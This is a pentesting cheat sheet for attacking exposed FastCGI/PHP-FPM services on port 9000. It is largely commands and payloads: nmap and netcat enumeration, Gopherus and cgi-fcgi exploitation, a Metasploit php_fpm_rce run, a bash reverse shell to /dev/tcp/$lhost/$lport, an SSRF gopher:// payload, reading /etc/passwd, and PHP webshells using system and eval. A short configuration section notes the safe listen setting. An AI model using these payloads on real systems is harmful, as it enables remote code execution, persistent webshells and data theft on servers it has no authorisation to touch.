# Port 9000 - FastCGI

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Remote Code Execution](#remote-code-execution)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -sV -p 9000 $rhost && nc -nv $rhost 9000
```

### Nmap Scripts

```shell
nmap -sV -sC -p9000 $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 9000
```

### Check Service Type

```shell
# FastCGI typically used with PHP-FPM
# Send basic FastCGI request to check
```

---

## Exploitation

### PHP-FPM Remote Code Execution

> If PHP-FPM is exposed and misconfigured

```shell
# Using cgi-fcgi
apt install libfcgi0ldbl

# Test connection
cgi-fcgi -bind -connect $rhost:9000
```

### Gopherus - Generate FastCGI Payload

```shell
# Install Gopherus
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus

# Generate PHP-FPM payload
python gopherus.py --exploit fastcgi

# Enter PHP file path (e.g., /var/www/html/index.php)
# Enter command to execute
```

### Manual FastCGI Exploitation

```python
#!/usr/bin/env python3
import socket
import struct

def send_fastcgi(host, port, php_file, cmd):
    # FastCGI record types
    FCGI_BEGIN_REQUEST = 1
    FCGI_PARAMS = 4
    FCGI_STDIN = 5
    
    # PHP code to execute
    php_code = f"<?php system('{cmd}'); ?>"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Build FastCGI request
    # ... (complex protocol implementation)
    
    sock.close()

# Usage
send_fastcgi("$rhost", 9000, "/var/www/html/index.php", "id")
```

### Using fpm-remote-shell

```shell
# https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

python fpm.py $rhost /var/www/html/index.php -c '<?php system("id"); ?>'
```

---

## Remote Code Execution

### Conditions for RCE

1. PHP-FPM exposed to network
2. Know path to a PHP file
3. PHP-FPM configured to execute .php files

### Common PHP File Paths

```shell
/var/www/html/index.php
/var/www/html/info.php
/usr/share/php/index.php
/var/www/public/index.php
/var/www/app/public/index.php
/var/www/wordpress/index.php
```

### Reverse Shell via FastCGI

```shell
# Generate payload with Gopherus
python gopherus.py --exploit fastcgi

# Enter PHP file path
# Enter: bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'

# Use generated payload via SSRF or direct connection
```

### Using Metasploit

```shell
msfconsole
use exploit/multi/http/php_fpm_rce
set RHOSTS $rhost
set RPORT 9000
set LHOST $lhost
set LPORT $lport
exploit
```

---

## SSRF to FastCGI

> When FastCGI is only locally accessible

```shell
# Using Gopherus to generate gopher:// payload
python gopherus.py --exploit fastcgi

# Use gopher URL in SSRF vulnerability
gopher://127.0.0.1:9000/_<encoded_fastcgi_request>
```

---

## Post Exploitation

### Read Sensitive Files

```shell
# Via PHP
<?php echo file_get_contents('/etc/passwd'); ?>

# Via system command
<?php system('cat /etc/passwd'); ?>
```

### Webshell Upload

```shell
# Write webshell
<?php file_put_contents('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>'); ?>

# Or use PHP's built-in web shell
<?php eval($_POST["cmd"]); ?>
```

---

## Configuration Files

```shell
# PHP-FPM config locations
/etc/php/7.4/fpm/pool.d/www.conf
/etc/php-fpm.d/www.conf
/usr/local/etc/php-fpm.d/www.conf

# Key settings to check
listen = 127.0.0.1:9000  # Should not be 0.0.0.0:9000
listen.allowed_clients = 127.0.0.1
```

---

## Tools

- Gopherus: https://github.com/tarunkant/Gopherus
- fpm-remote-shell: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
- fcgi-exploit: https://github.com/bnoordhuis/fcgi-exploit

---

## References

- [HackTricks - FastCGI](https://book.hacktricks.wiki/network-services-pentesting/9000-pentesting-fastcgi.html)
